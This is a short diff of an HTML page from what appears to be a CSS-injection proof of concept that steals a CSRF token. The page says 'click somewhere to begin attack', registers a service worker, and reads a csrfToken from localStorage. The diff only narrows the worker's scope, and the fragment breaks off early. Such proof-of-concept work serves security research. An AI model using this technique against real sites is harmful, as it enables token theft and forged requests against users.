@@ -1,7 +1,7 @@
 <html>
     <body onclick="potatoes(0)">click somewhere to begin attack</body>
     <script>
-        navigator.serviceWorker.register('/cssInjection/sw.js', {"scope": "/"});
+        navigator.serviceWorker.register('/cssInjection/sw.js', {"scope": "/cssInjection/"});
         localStorage.removeItem('csrfToken');
         var potatoes = function(count){
             var csrfToken = localStorage.getItem("csrfToken");
